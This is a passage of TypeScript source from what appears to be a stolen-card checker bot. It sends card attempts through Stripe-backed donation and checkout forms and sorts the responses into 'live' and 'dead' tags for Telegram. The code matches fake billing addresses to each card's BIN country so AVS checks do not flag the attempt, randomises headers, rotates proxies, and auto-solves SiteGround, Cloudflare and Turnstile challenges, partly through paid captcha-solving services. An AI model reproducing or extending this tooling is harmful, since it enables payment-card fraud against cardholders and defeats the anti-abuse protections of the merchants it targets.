  // -- Mexico (state code used; CP NNNNN) --
  { city: "Mexico City",   state: "Ciudad de M�xico", stateCode: "CMX", zip: "06600", country: "MX", line1: "Paseo de la Reforma 200" },
  { city: "Guadalajara",   state: "Jalisco",        stateCode: "JAL", zip: "44100",  country: "MX", line1: "Avenida Ju�rez 100" },
  { city: "Monterrey",     state: "Nuevo Le�n",     stateCode: "NLE", zip: "64000",  country: "MX", line1: "Avenida Constituci�n 400" },
  { city: "Canc�n",        state: "Quintana Roo",   stateCode: "ROO", zip: "77500",  country: "MX", line1: "Avenida Tulum 50" },
  // -- India (state code used; PIN NNNNNN) --
  { city: "Mumbai",        state: "Maharashtra",    stateCode: "MH", zip: "400001",  country: "IN", line1: "10 Marine Drive" },
  { city: "Delhi",         state: "Delhi",          stateCode: "DL", zip: "110001",  country: "IN", line1: "20 Connaught Place" },
  { city: "Bangalore",     state: "Karnataka",      stateCode: "KA", zip: "560001",  country: "IN", line1: "50 Mahatma Gandhi Road" },
  { city: "Chennai",       state: "Tamil Nadu",     stateCode: "TN", zip: "600002",  country: "IN", line1: "30 Anna Salai" },
  { city: "Hyderabad",     state: "Telangana",      stateCode: "TS", zip: "500081",  country: "IN", line1: "40 Banjara Hills" },
  // -- Singapore (6-digit postal) --
  { city: "Singapore",     state: "Singapore",      stateCode: "", zip: "238823",   country: "SG", line1: "2 Orchard Turn" },
  { city: "Singapore",     state: "Singapore",      stateCode: "", zip: "049513",   country: "SG", line1: "6 Raffles Quay" },
  { city: "Singapore",     state: "Singapore",      stateCode: "", zip: "018956",   country: "SG", line1: "10 Bayfront Avenue" },
  // -- United Arab Emirates (no postal-code system) --
  { city: "Dubai",         state: "Dubai",          stateCode: "", zip: "",         country: "AE", line1: "Sheikh Zayed Road 100" },
  { city: "Abu Dhabi",     state: "Abu Dhabi",      stateCode: "", zip: "",         country: "AE", line1: "Corniche Road 50" },
  // -- New Zealand --
  { city: "Auckland",      state: "Auckland",       stateCode: "", zip: "1010",     country: "NZ", line1: "200 Queen Street" },
  { city: "Wellington",    state: "Wellington",     stateCode: "", zip: "6011",     country: "NZ", line1: "100 Lambton Quay" },
  { city: "Christchurch",  state: "Canterbury",     stateCode: "", zip: "8011",     country: "NZ", line1: "50 Cashel Street" },
];

/** Billing rows whose country matches `cc` (ISO-2). Falls back to the US pool
 *  (largest, AVS-capable) when there's no match, so it's never empty. Matching
 *  the billing country to the card's issuing country is what lets AVS actually
 *  run � a mismatched country returns "AVS unsupported" and looks fraudulent. */
export function billingPoolForCountry(cc?: string): BillingEntry[] {
  const want = (cc || "").trim().toUpperCase();
  const matches = want ? BILLING_DATA.filter(b => b.country === want) : [];
  return matches.length ? matches : BILLING_DATA.filter(b => b.country === "US");
}

/** Pick a billing address matched to the card's BIN country. Resolves the
 *  country via the (cached) BIN lookup, so this adds no real latency after the
 *  first hit. Use this instead of `pick(BILLING_DATA)` so AVS isn't defeated by
 *  a random foreign address. */
export async function pickBilling(cardNumber: string): Promise<BillingEntry> {
  let cc = "";
  try { cc = (await lookupBin(cardNumber))?.country || ""; } catch { /* ignore � fall back to US */ }
  return pick(billingPoolForCountry(cc));
}

const EMAIL_DOMAINS = ["gmail.com", "yahoo.com", "hotmail.com", "outlook.com", "protonmail.com", "aol.com", "icloud.com", "live.com"];

// Accept-Language pool � picked per tokenize request for header diversity
const ACCEPT_LANGUAGE_OPTIONS = [
  "en-US,en;q=0.9",
  "en-GB,en;q=0.9",
  "en-CA,en;q=0.9,en-US;q=0.8",
  "en-US,en;q=0.9,fr;q=0.8",
  "en-AU,en;q=0.9,en-US;q=0.8",
  "en-US,en;q=0.8",
  "en-GB,en-US;q=0.9,en;q=0.8",
  "en,en-US;q=0.9",
];

// Ban signal strings � if any appear in a response body we know Stripe/site is throttling us
const BAN_SIGNALS = [
  "rate_limit", "too many requests", "rate limit exceeded", "api rate limit",
  "request rate too high", "temporarily blocked", "access denied",
  "ip blocked", "ip banned", "please try again later", "service temporarily unavailable",
];

// Nonce/session errors that mean we should retry the full flow rather than classify as dead
const REFRESH_ERRORS = new Set([
  "refresh the page", "refresh and try again", "not able to process this request",
  "nonce verification failed", "session expired", "invalid nonce", "nonce is invalid",
  "are you sure you want to do this", "nonce is no longer valid",
]);

// --- Keyword classifier (paycv.py-style) -------------------------------------
// Mirrors the reference Python script's classification keys. Used as a
// FAST PRE-CHECK before the full decline-code classifier � a substring hit on
// any of these keys yields a fixed (status, label) pair that maps to the
// 7 Telegram status tags: HIT / CCN / CVV / 3DS / LOW_FUND / EXPIRED /
// DECLINED. Case-insensitive substring matching matches the Python `.lower()`
// + `in` semantics exactly.
//
// Why both this AND the decline-code map exist:
// � Some sites (GiveWP v3, Charitable, Gravity Forms) return human strings
//   instead of Stripe decline_codes. This catches them.
// � Some Stripe responses are wrapped in WP/JS error envelopes where the
//   decline_code is buried � the human string surfaces in `last_payment_error`
//   message anyway, so we match on that too.
//
// Order matters: HIT must win over CCN must win over CVV must win over 3DS,
// because some pages include multiple of these phrases (e.g. "successful"
// in a banner above a 3DS challenge form).
export const STRIPE_RESPONSE_KEYS = {
  success: [
    "appreciate", "appreciated", "Payment Success", "redirect_to", "thank",
    "Thanks", "Gracias", "Thank", "redirectUrl", "succeeded", "confirmation",
    "Successful!", "Thanks!", "Successful", "hide_form", "redirect_url",
    "Merci", "Form entry saved", "Success!",
  ],
  ccn: ["security code is incorrect", "INCORRECT_CVV"],
  invalid: ["Invalid account"],
  declined: [
    "cannot be processed", "CARD_DECLINED", "Your card was declined.",
    "generic_decline", "cannot process your order",
  ],
  cvv: [
    "transaction_not_allowed",
    "Your card does not support this type of purchase",
    "do_not_honor",
  ],
  insufficient: [
    "Your card has insufficient funds.", "INSUFFICIENT_FUNDS",
    "insufficient_funds", "Insufficient Funds", "Insufficient",
  ],
  paymentFailed: ["does not match the billing address"],
  expired: ["card has expired"],
  incorrect: ["card number is incorrect"],
  manycc: ["Too Many Requests"],
  riskcc: ["again in a little bit"],
  otp: [
    "Verifying", "action_required", "verifying", "call_next_method",
    "requires_source_action", "CompletePaymentChallenge", "requires_action",
    "additional action before completion!", "nextAction",
    // Message-based 3DS signals � gateways print these instead of a status code
    "authentication required", "authentication_required", "requires authentication",
    "3d secure", "3dsecure", "3d-secure", "three_d_secure", "3ds",
    "strong customer authentication", "sca_required", "payer_action_required",
    "authentication_failure", "payment_intent_authentication_failure",
  ],
  captcha: ["reCaptcha"],
  exceed: ["exceeding its amount limit"],
  proxyFailed: ["Failed to perform"],
} as const;

export type StripeResponseTag =
  | "HIT" | "CCN" | "CVV" | "3DS"
  | "LOW_FUND" | "EXPIRED" | "DECLINED"
  | "RISK" | "CAPTCHA" | "RATE_LIMIT" | "PROXY_FAIL"
  | "AVS_FAIL" | "INCORRECT" | "INVALID" | "EXCEED" | "DEAD";

/** Classify a Stripe response string into a coarse-grained status tag plus
 *  a human-readable label. Returns null when no key matched � caller falls
 *  back to the full decline-code classifier.
 *
 *  Named "Tag" suffix because there's a separate full-result classifier
 *  (classifyStripeResponse, lower in this file) that returns a CheckResult. */
export function classifyStripeResponseTag(
  response: string,
): { tag: StripeResponseTag; label: string } | null {
  if (!response) return null;
  const lower = response.toLowerCase();
  const hit = (keys: readonly string[]) =>
    keys.some(k => lower.includes(k.toLowerCase()));
  // Order is intentional � see comment above STRIPE_RESPONSE_KEYS.
  if (hit(STRIPE_RESPONSE_KEYS.success))      return { tag: "HIT",        label: "HIT" };
  if (hit(STRIPE_RESPONSE_KEYS.ccn))          return { tag: "CCN",        label: "CCN" };
  if (hit(STRIPE_RESPONSE_KEYS.cvv))          return { tag: "CVV",        label: "CVV" };
  if (hit(STRIPE_RESPONSE_KEYS.otp))          return { tag: "3DS",        label: "3DS" };
  if (hit(STRIPE_RESPONSE_KEYS.insufficient)) return { tag: "LOW_FUND",   label: "INSUFFICIENT" };
  if (hit(STRIPE_RESPONSE_KEYS.expired))      return { tag: "EXPIRED",    label: "EXPIRED" };
  if (hit(STRIPE_RESPONSE_KEYS.incorrect))    return { tag: "INCORRECT",  label: "INCORRECT" };
  if (hit(STRIPE_RESPONSE_KEYS.invalid))      return { tag: "INVALID",    label: "INVALID" };
  if (hit(STRIPE_RESPONSE_KEYS.exceed))       return { tag: "EXCEED",     label: "LIMIT EXCEEDED" };
  if (hit(STRIPE_RESPONSE_KEYS.captcha))      return { tag: "CAPTCHA",    label: "CAPTCHA" };
  if (hit(STRIPE_RESPONSE_KEYS.manycc))       return { tag: "RATE_LIMIT", label: "RATE LIMITED" };
  if (hit(STRIPE_RESPONSE_KEYS.riskcc))       return { tag: "RISK",       label: "RISK HOLD" };
  if (hit(STRIPE_RESPONSE_KEYS.paymentFailed)) return { tag: "AVS_FAIL",  label: "AVS MISMATCH" };
  if (hit(STRIPE_RESPONSE_KEYS.declined))     return { tag: "DECLINED",   label: "DECLINED" };
  if (hit(STRIPE_RESPONSE_KEYS.proxyFailed))  return { tag: "PROXY_FAIL", label: "PROXY FAILED" };
  return null;
}

export const CCN_LIVE_CODES = [
  // Core decline-but-card-exists codes
  "insufficient_funds", "do_not_honor", "generic_decline", "call_issuer",
  "try_again_later", "not_permitted", "service_not_allowed",
  "transaction_not_allowed", "authentication_required", "approve_with_id",
  "issuer_not_available", "withdrawal_count_limit_exceeded",
  "reenter_transaction", "new_account_information_available",
  "card_declined",
  // Additional live codes from reference files
  "card_velocity_exceeded",        // card hit activity limit � card is real
  "not_sufficient_funds",          // synonym for insufficient_funds
  "incorrect_zip",                 // AVS mismatch � card number + expiry valid
  "cvc_check_failed",              // CVC failed but card number accepted � card live
  "online_or_offline_pin_required", // card requires PIN � valid card
  "stop_payment_order",             // issuer placed a stop on this transaction � card valid
  "debit_card_not_supported",       // gate accepts credit only � card is live
];

/** Decline codes that mean "the card is real but needs / failed 3DS auth".
 *  These must classify as CCN/CVV LIVE with a 3DS tag � never DEAD. A card can
 *  only reach the 3DS step after the issuer confirms it exists and is enrolled,
 *  so authentication_failure is still a live card, just blocked by the challenge
 *  (which an automated flow can't complete). Checked before the dead fallthrough
 *  in classifyDeclineCode. */
export const THREE_DS_LIVE_CODES = [
  "authentication_required",
  "card_authentication_required",
  "payment_intent_authentication_failure",
  "three_d_secure_authentication",
  "three_d_secure_redirect",
];

export const CCN_WRONG_CVV_CODES = [
  "incorrect_cvc", "invalid_cvc",
];

export const DEAD_CODES = [
  "expired_card", "incorrect_number", "invalid_number", "invalid_expiry_month",
  "invalid_expiry_year", "lost_card", "stolen_card", "pickup_card",
  "restricted_card", "fraudulent", "merchant_blacklist", "security_violation",
  "invalid_account", "testmode_decline",
  "revoked_card",                   // issuer explicitly revoked � not retryable
];

export const STRIPE_DECLINE_MAP: Record<string, string> = {
  // Card data errors ? dead
  incorrect_number: "Incorrect Card Number",
  invalid_number: "Invalid Card Number",
  invalid_expiry_month: "Invalid Expiry Month",
  invalid_expiry_year: "Invalid Expiry Year",
  invalid_cvc: "Invalid CVC",
  incorrect_cvc: "Incorrect CVC",
  expired_card: "Expired Card",
  lost_card: "Lost Card",
  stolen_card: "Stolen Card",
  pickup_card: "Pick Up Card",
  restricted_card: "Restricted Card",
  fraudulent: "Fraudulent",
  merchant_blacklist: "Merchant Blacklist",
  security_violation: "Security Violation",
  invalid_account: "Invalid Account",
  testmode_decline: "Test Mode Decline",
  // Live card decline codes
  card_declined: "Card Declined",
  insufficient_funds: "Insufficient Funds",
  not_sufficient_funds: "Insufficient Funds",
  do_not_honor: "Do Not Honor",
  generic_decline: "Generic Decline",
  authentication_required: "3DS Required",
  card_authentication_required: "3DS Required",
  payment_intent_authentication_failure: "3DS Auth Failed (Live)",
  three_d_secure_authentication: "3DS Required",
  three_d_secure_redirect: "3DS Redirect",
  try_again_later: "Try Again Later",
  not_permitted: "Not Permitted",
  service_not_allowed: "Service Not Allowed",
  transaction_not_allowed: "Transaction Not Allowed",
  approve_with_id: "Approve With ID",
  call_issuer: "Call Issuer",
  issuer_not_available: "Issuer Not Available",
  card_velocity_exceeded: "Activity Limit (Live)",
  withdrawal_count_limit_exceeded: "Withdrawal Limit (Live)",
  incorrect_zip: "AVS Mismatch (Live)",
  cvc_check_failed: "CVC Mismatch (Live)",
  online_or_offline_pin_required: "PIN Required (Live)",
  // Additional Stripe/Braintree codes from reference
  reenter_transaction: "Reenter Transaction",
  new_account_information_available: "Card Updated � New Info",
  no_action_taken: "No Action Taken",
  revocation_of_authorization: "Authorization Revoked",
  revocation_of_all_authorizations: "All Authorizations Revoked",
  pin_try_exceeded: "PIN Tries Exceeded",
  card_not_supported: "Card Not Supported",
  invalid_amount: "Invalid Amount",
  currency_not_supported: "Currency Not Supported",
  stop_payment_order: "Stop Payment Order",
  revoked_card: "Revoked Card",
  debit_card_not_supported: "Debit Card Not Supported",
  // Gateway errors
  processing_error: "Processing Error",
};

export function pick<T>(arr: T[]): T {
  return arr[Math.floor(Math.random() * arr.length)];
}

function rndStr(len: number): string {
  return Array.from({ length: len }, () => "abcdefghijklmnopqrstuvwxyz"[Math.floor(Math.random() * 26)]).join("");
}

function rndEmail(): string {
  return `${rndStr(8)}${Math.floor(Math.random() * 9000) + 1000}@${pick(EMAIL_DOMAINS)}`;
}

function rndName(): string {
  const first = ["James", "Mary", "John", "Emma", "Robert", "Sarah", "Michael", "Laura", "David", "Anna"];
  const last = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Wilson", "Moore"];
  return `${pick(first)} ${pick(last)}`;
}

export function extractBetween(text: string, start: string, end: string): string | null {
  try {
    const idx = text.indexOf(start);
    if (idx === -1) return null;
    const rest = text.substring(idx + start.length);
    const endIdx = rest.indexOf(end);
    if (endIdx === -1) return null;
    return rest.substring(0, endIdx);
  } catch {
    return null;
  }
}

const BIN_CACHE_TTL_MS = 60 * 60 * 1000; // 1 hour TTL
export interface BinInfo {
  bank: string;
  type: string;       // DEBIT / CREDIT / PREPAID
  scheme: string;     // visa / mastercard / discover / amex / jcb
  country: string;    // ISO-2
  level?: string;     // CLASSIC / GOLD / PLATINUM / BLACK / WORLD ELITE �
  flag?: string;      // ???? � country flag emoji when antipublic.cc returned one
}
const binCache = new Map<string, BinInfo & { cachedAt: number }>();

export async function lookupBin(bin: string): Promise<BinInfo | null> {
  const prefix = bin.substring(0, 6);
  const cached = binCache.get(prefix);
  if (cached && Date.now() - cached.cachedAt < BIN_CACHE_TTL_MS) {
    return cached;
  }
  // Primary: bins.antipublic.cc � richer data (level + flag), used by reference bots
  try {
    const resp = await fetch(`https://bins.antipublic.cc/bins/${prefix}`, {
      signal: AbortSignal.timeout(3000),
    });
    if (resp.ok) {
      const data = await resp.json();
      if (data && (data.brand || data.scheme || data.bank)) {
        const info = {
          bank: data.bank || "",
          type: (data.type || "").toUpperCase(),
          scheme: (data.brand || data.scheme || "").toLowerCase(),
          country: (data.country_code || data.country?.alpha2 || "").toUpperCase(),
          level: data.level ? String(data.level).toUpperCase() : undefined,
          flag: data.country_flag || data.flag || undefined,
          cachedAt: Date.now(),
        };
        binCache.set(prefix, info);
        return info;
      }
    }
  } catch { /* fall through */ }
  // Fallback: lookup.binlist.net (no level / flag)
  try {
    const resp = await fetch(`https://lookup.binlist.net/${prefix}`, {
      headers: { "Accept-Version": "3" },
      signal: AbortSignal.timeout(3000),
    });
    if (!resp.ok) return null;
    const data = await resp.json();
    const info = {
      bank: data.bank?.name || "",
      type: data.type || "",
      scheme: data.scheme || "",
      country: data.country?.alpha2 || "",
      cachedAt: Date.now(),
    };
    binCache.set(prefix, info);
    return info;
  } catch {
    return null;
  }
}

export function parseCookies(headers: Headers): string[] {
  const cookies: string[] = [];
  const setCookieHeaders = (headers as any).getSetCookie?.() || [];
  if (Array.isArray(setCookieHeaders) && setCookieHeaders.length > 0) {
    for (const h of setCookieHeaders) {
      const name = h.split(";")[0].trim();
      if (name) cookies.push(name);
    }
  } else {
    const raw = headers.get("set-cookie");
    if (raw) {
      for (const part of raw.split(/,(?=[^ ])/)) {
        const name = part.split(";")[0].trim();
        if (name) cookies.push(name);
      }
    }
  }
  return cookies;
}

export function mergeCookies(existing: string, newCookies: string[]): string {
  const map = new Map<string, string>();
  if (existing) {
    for (const c of existing.split("; ")) {
      const [k] = c.split("=");
      if (k) map.set(k.trim(), c);
    }
  }
  for (const c of newCookies) {
    const [k] = c.split("=");
    if (k) map.set(k.trim(), c);
  }
  return Array.from(map.values()).join("; ");
}

export interface SessionState {
  ua: string;
  secChUa: string;
  cookies: string;
  proxy?: string;
  /** External captcha solver creds � when set, Turnstile/hCaptcha challenges
   *  will be auto-solved via the chosen provider's API. */
  captchaProvider?: "2captcha" | "anticaptcha";
  captchaApiKey?: string;
}

async function solveSgCaptcha(challengeUrl: string, challengeHtml: string, state: SessionState): Promise<{ solved: boolean; cookies: string[] }> {
  try {
    const cookieMatch = challengeHtml.match(/document\.cookie\s*=\s*["']([^"']+)/);
    if (cookieMatch) {
      return { solved: true, cookies: [cookieMatch[1].split(";")[0].trim()] };
    }

    const hashMatch = challengeHtml.match(/sg_captcha[_-]?(?:cookie|token|hash)['":\s]*=\s*["']([^"']+)/i);
    if (hashMatch) {
      return { solved: true, cookies: [`sg_captcha=${hashMatch[1]}`] };
    }

    const assignMatch = challengeHtml.match(/([a-zA-Z_$]+)\s*=\s*['"]([a-f0-9]{32,})['"];?\s*(?:document\.cookie|location)/);
    if (assignMatch) {
      return { solved: true, cookies: [`sg_captcha=${assignMatch[2]}`] };
    }

    const metaRedirect = challengeHtml.match(/content=["']\d+;\s*url=([^"']+)/i);
    if (metaRedirect) {
      const redirectUrl = new URL(metaRedirect[1], challengeUrl).href;
      const controller = new AbortController();
      const timeout = setTimeout(() => controller.abort(), 5000);
      try {
        const resp = await fetch(redirectUrl, {
          headers: {
            "User-Agent": state.ua,
            Cookie: state.cookies,
          },
          redirect: "follow",
          signal: controller.signal,
        });
        clearTimeout(timeout);
        const newCookies = parseCookies(resp.headers);
        if (newCookies.length > 0) {
          return { solved: true, cookies: newCookies };
        }
      } catch { clearTimeout(timeout); }
    }

    const formMatch = challengeHtml.match(/<form[^>]*action=["']([^"']+)["'][^>]*>([\s\S]*?)<\/form>/i);
    if (formMatch) {
      const action = formMatch[1];
      const hiddenInputs = formMatch[2].matchAll(/<input[^>]*name=["']([^"']+)["'][^>]*value=["']([^"']*)["']/gi);
      const formData = new URLSearchParams();
      for (const inp of hiddenInputs) {
        formData.append(inp[1], inp[2]);
      }
      const formUrl = new URL(action, challengeUrl).href;
      const controller = new AbortController();
      const timeout = setTimeout(() => controller.abort(), 5000);
      try {
        const resp = await fetch(formUrl, {
          method: "POST",
          headers: {
            "User-Agent": state.ua,
            "Content-Type": "application/x-www-form-urlencoded",
            Cookie: state.cookies,
          },
          body: formData.toString(),
          redirect: "follow",
          signal: controller.signal,
        });
        clearTimeout(timeout);
        const newCookies = parseCookies(resp.headers);
        if (newCookies.length > 0) {
          return { solved: true, cookies: newCookies };
        }
      } catch { clearTimeout(timeout); }
    }

    return { solved: false, cookies: [] };
  } catch {
    return { solved: false, cookies: [] };
  }
}

async function solveCloudflarePow(html: string, url: string, state: SessionState): Promise<{ solved: boolean; state: SessionState }> {
  try {
    if (html.includes("challenge-platform") || html.includes("cf-turnstile") || html.includes("challenges.cloudflare.com")) {
      const jschlMatch = html.match(/name="jschl_vc"\s*value="([^"]+)"/);
      const passMatch = html.match(/name="pass"\s*value="([^"]+)"/);
      const rMatch = html.match(/name="r"\s*value="([^"]+)"/);

      if (jschlMatch && passMatch) {
        const parsedUrl = new URL(url);
        const challengeBody = new URLSearchParams({
          r: rMatch?.[1] || "",
          jschl_vc: jschlMatch[1],
          pass: passMatch[1],
          jschl_answer: "",
        });

        const mathMatch = html.match(/a\.value\s*=\s*([\d.]+)\s*[+\-*/]\s*([\d.]+)/);
        if (mathMatch) {
          const answer = parseFloat(mathMatch[1]) + parsedUrl.hostname.length;
          challengeBody.set("jschl_answer", String(answer));
        }

        await new Promise(r => setTimeout(r, 4000));

        const controller = new AbortController();
        const timeout = setTimeout(() => controller.abort(), 8000);
        try {
          const resp = await fetch(`${parsedUrl.origin}/cdn-cgi/l/chk_jschl?${challengeBody.toString()}`, {
            headers: { "User-Agent": state.ua, Cookie: state.cookies, Referer: url },
            redirect: "follow",
            signal: controller.signal,
          });
          clearTimeout(timeout);
          const newCookies = parseCookies(resp.headers);
          if (newCookies.some(c => c.includes("cf_clearance"))) {
            return { solved: true, state: { ...state, cookies: mergeCookies(state.cookies, newCookies) } };
          }
        } catch { clearTimeout(timeout); }
      }
    }
    return { solved: false, state };
  } catch {
    return { solved: false, state };
  }
}

export interface SessionFetchOpts {
  method?: string;
  body?: string;
  contentType?: string;
  referer?: string;
  origin?: string;
  accept?: string;
  xRequestedWith?: boolean;
  timeout?: number;
  maxRetries?: number;
  extraHeaders?: Record<string, string>;
}

export async function sessionFetch(
  url: string, state: SessionState,
  opts: SessionFetchOpts = {}
): Promise<{ text: string; ok: boolean; status: number; state: SessionState }> {
  const fetchTimeout = opts.timeout || 12000;
  const maxRetries = opts.maxRetries ?? 2;

  // Session cache seed � if this state has no cookies yet AND we have a cached
  // session for this hostname from a recent successful check (<5 min old),
  // start from those cookies instead of empty. Saves the page-scrape round
  // trip on burst checks against the same gate.
  if (!state.cookies) {
    const cached = getCachedSession(url);
    if (cached?.cookies) {
      state = { ...state, cookies: cached.cookies };
    }
  }

  for (let attempt = 0; attempt <= maxRetries; attempt++) {
    // Per-site rate gating � increases jitter the more we've been blocked
    // or the more requests we've fired at this host in the last 10 minutes.
    await waitSiteCooldown(url);
    const headers: Record<string, string> = {
      "User-Agent": state.ua,
      "sec-ch-ua": state.secChUa,
      "sec-ch-ua-mobile": "?0",
      "sec-ch-ua-platform": '"Windows"',
      Accept: opts.accept || "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
      "Accept-Language": "en-US,en;q=0.9",
      "Accept-Encoding": "identity",
    };

    if (state.cookies) headers["Cookie"] = state.cookies;
    if (opts.referer) headers["Referer"] = opts.referer;
    if (opts.origin) headers["Origin"] = opts.origin;
    if (opts.contentType) headers["Content-Type"] = opts.contentType;
    if (opts.xRequestedWith) headers["X-Requested-With"] = "XMLHttpRequest";
    if (opts.extraHeaders) Object.assign(headers, opts.extraHeaders);

    if (opts.method === "POST") {
      headers["Sec-Fetch-Dest"] = "empty";
      headers["Sec-Fetch-Mode"] = opts.xRequestedWith ? "cors" : "navigate";
      headers["Sec-Fetch-Site"] = "same-origin";
    } else {
      headers["Sec-Fetch-Dest"] = "document";
      headers["Sec-Fetch-Mode"] = "navigate";
      headers["Sec-Fetch-Site"] = "none";
      headers["Sec-Fetch-User"] = "?1";
      headers["Upgrade-Insecure-Requests"] = "1";
    }

    const controller = new AbortController();
    const timer = setTimeout(() => controller.abort(), fetchTimeout);

    try {
      const fetchOpts: Record<string, any> = {
        method: opts.method || "GET",
        headers,
        body: opts.body,
        signal: controller.signal,
        redirect: "follow",
      };
      if (state.proxy && !_deadProxies.has(state.proxy)) {
        try {
          const dispatcher = await getProxyDispatcher(state.proxy);
          if (dispatcher) fetchOpts.dispatcher = dispatcher;
        } catch { /* proxy setup failed � proceed direct */ }
      }

      let resp: any;
      if (fetchOpts.dispatcher) {
        // Must use undici's own fetch � global.fetch uses a different bundled undici
        // internally and won't recognise a ProxyAgent from node_modules/undici@7
        const proxyFetch = _undiciFetch ?? (fetch as any);
        try {
          resp = await proxyFetch(url, fetchOpts);
        } catch (proxyErr: any) {
          if (proxyErr.name === "AbortError") throw proxyErr; // real timeout � outer catch handles it
          // Dead / unreachable proxy � blacklist and retry directly with a FRESH timeout window
          // (the original AbortController may have elapsed most of its budget already)
          dbg(`[proxy] fetch failed (${(proxyErr.cause ?? proxyErr).message ?? proxyErr.message}); blacklisting ${state.proxy} and falling back to direct`);
          if (state.proxy) { _deadProxies.add(state.proxy); _proxyAgents.delete(state.proxy); }
          delete fetchOpts.dispatcher;
          clearTimeout(timer); // stop the original timer
          const fbController = new AbortController();
          const fbTimer = setTimeout(() => fbController.abort(), fetchTimeout);
          fetchOpts.signal = fbController.signal;
          try {
            resp = await (fetch as any)(url, fetchOpts);
            clearTimeout(fbTimer);
          } catch (fbErr: any) {
            clearTimeout(fbTimer);
            throw fbErr; // re-throw � outer catch handles AbortError retries
          }
        }
      } else {
        resp = await (fetch as any)(url, fetchOpts);
      }
      clearTimeout(timer);

      const newCookies = parseCookies(resp.headers);
      const updatedState = { ...state, cookies: mergeCookies(state.cookies, newCookies) };
      const finalUrl = resp.url || url;

      if (/sgcaptcha|\.well-known\/sgcaptcha/i.test(finalUrl)) {
        const challengeHtml = await resp.text();
        dbg(`[captcha] SiteGround challenge detected at ${finalUrl}, attempt ${attempt + 1}`);

        if (attempt < maxRetries) {
          const solved = await solveSgCaptcha(finalUrl, challengeHtml, updatedState);
          if (solved.solved) {
            state = { ...updatedState, cookies: mergeCookies(updatedState.cookies, solved.cookies) };
            dbg(`[captcha] SiteGround challenge solved, retrying with cookies`);
            continue;
          }
        }
        siteCooldown.recordBlock(url);
        return { text: "CAPTCHA_BLOCKED: SiteGround CAPTCHA - auto-solve failed", ok: false, status: 403, state: updatedState };
      }

      const text = await resp.text();

      if (text.length < 3000 && /sgcaptcha|\.well-known\/sgcaptcha/i.test(text)) {
        dbg(`[captcha] SiteGround challenge in body, attempt ${attempt + 1}`);
        if (attempt < maxRetries) {
          const solved = await solveSgCaptcha(url, text, updatedState);
          if (solved.solved) {
            state = { ...updatedState, cookies: mergeCookies(updatedState.cookies, solved.cookies) };
            dbg(`[captcha] SiteGround body challenge solved, retrying`);
            continue;
          }
        }
        siteCooldown.recordBlock(url);
        return { text: "CAPTCHA_BLOCKED: SiteGround CAPTCHA redirect detected", ok: false, status: 403, state: updatedState };
      }

      if (resp.status === 403 && text.length < 5000 && (text.includes("challenge-platform") || text.includes("cf-turnstile") || text.includes("challenges.cloudflare.com"))) {
        dbg(`[captcha] Cloudflare challenge detected, attempt ${attempt + 1}`);
        if (attempt < maxRetries) {
          // First try the lightweight PoW solver (no external API)
          const cfResult = await solveCloudflarePow(text, url, updatedState);
          if (cfResult.solved) {
            state = cfResult.state;
            dbg(`[captcha] Cloudflare challenge solved (PoW), retrying`);
            continue;
          }
          // Fall back to external captcha solver (2captcha / anticaptcha) for Turnstile
          const turnstileKey = text.match(/data-sitekey=["']([^"']+)["']/i)?.[1]
            || text.match(/sitekey["'\s:]+["']([0-9a-zA-Z_-]{20,})["']/)?.[1];
          if (turnstileKey && state.captchaApiKey && state.captchaProvider) {
            dbg(`[captcha] Trying ${state.captchaProvider} for Turnstile (sitekey=${turnstileKey.slice(0, 10)}�)`);
            const token = await solveCaptcha({
              provider: state.captchaProvider,
              apiKey: state.captchaApiKey,
              type: "turnstile",
              sitekey: turnstileKey,
              pageurl: url,
            });
            if (token) {
              // Inject token as cookie + retry. Sites typically read `cf-turnstile-response`
              // from the form POST, but having it as a cookie covers the common page-gate flow.
              state = { ...updatedState, cookies: mergeCookies(updatedState.cookies, [`cf-turnstile-response=${token}`]) };
              dbg(`[captcha] Turnstile token acquired, retrying`);
              continue;
            }
          }
        }
        siteCooldown.recordBlock(url);
        return { text: "CAPTCHA_BLOCKED: Cloudflare challenge - requires browser verification", ok: false, status: 403, state: updatedState };
      }

      if (resp.status === 503 && text.length < 5000 && /jschl_vc|jschl_answer|cf-browser-verification/i.test(text)) {
        dbg(`[captcha] Cloudflare JS challenge detected, attempt ${attempt + 1}`);
        if (attempt < maxRetries) {
          const cfResult = await solveCloudflarePow(text, url, updatedState);
          if (cfResult.solved) {
            state = cfResult.state;
            continue;
          }
        }
        siteCooldown.recordBlock(url);
        return { text: "CAPTCHA_BLOCKED: Cloudflare JS challenge", ok: false, status: 503, state: updatedState };
      }

      // Track site health: 429 / 5xx counts as a block; clean 2xx resets the counter.
      if (resp.status === 429 || (resp.status >= 500 && resp.status < 600)) {
        siteCooldown.recordBlock(url);
      } else if (resp.ok) {
        siteCooldown.recordSuccess(url);
        // Persist cookies so the next check on this host (within 5 min) can
        // skip the page-scrape step. Cheap optimization � only stores cookies,
        // not the response body. The cache is per-hostname so one host's
        // cookies don't bleed into another's.
        if (updatedState.cookies) {
          saveSession(url, {
            cookies: updatedState.cookies,
            nonces: {},
            proxy: updatedState.proxy,
            ua: updatedState.ua,
            secChUa: updatedState.secChUa,
          });
        }
      }
      return { text, ok: resp.ok, status: resp.status, state: updatedState };
    } catch (e: any) {
      clearTimeout(timer);
      if (attempt < maxRetries && e.name === "AbortError") {
        dbg(`[sessionFetch] Timeout on attempt ${attempt + 1}, retrying...`);
        await new Promise(r => setTimeout(r, 1000 + 1500 * attempt));
        continue;
      }
      throw e;
    }
  }

  return { text: "CAPTCHA_BLOCKED: Max retries exceeded", ok: false, status: 403, state };
}

// Shared classification for a Stripe decline_code / error code. Used by both the
// requires_payment_method branch and the top-level error branch so the live/dead
// decision and formatting stay in one place.
function classifyDeclineCode(
  errCode: string,
  errMsg: string,
  cvcCheck: any,
  gateName: string,
  cardMeta: CardMeta,
): CheckResult {
  const { brand, funding, country } = cardMeta;
  const msg = STRIPE_DECLINE_MAP[errCode] || errMsg || "Card Declined";
  const cvcMark: CheckMark = cvcCheck === "pass" ? "pass" : cvcCheck === "fail" ? "fail" : undefined;

  // Strict mode wins over the CCN-LIVE bucket for the 4 ambiguous codes
  // (generic_decline, do_not_honor, call_issuer, naked card_declined).
  // Per-gate liveOverrides still override this in checker.ts applyOverrides.
  if (shouldForceDead(errCode)) {
    return {
      status: "dead",
      response: formatCardResult({ tier: "DECLINED", mark: "?", detail: `${msg} (strict)`, brand, funding, country }),
      code: errCode, latency: 0, gate: gateName,
    };
  }

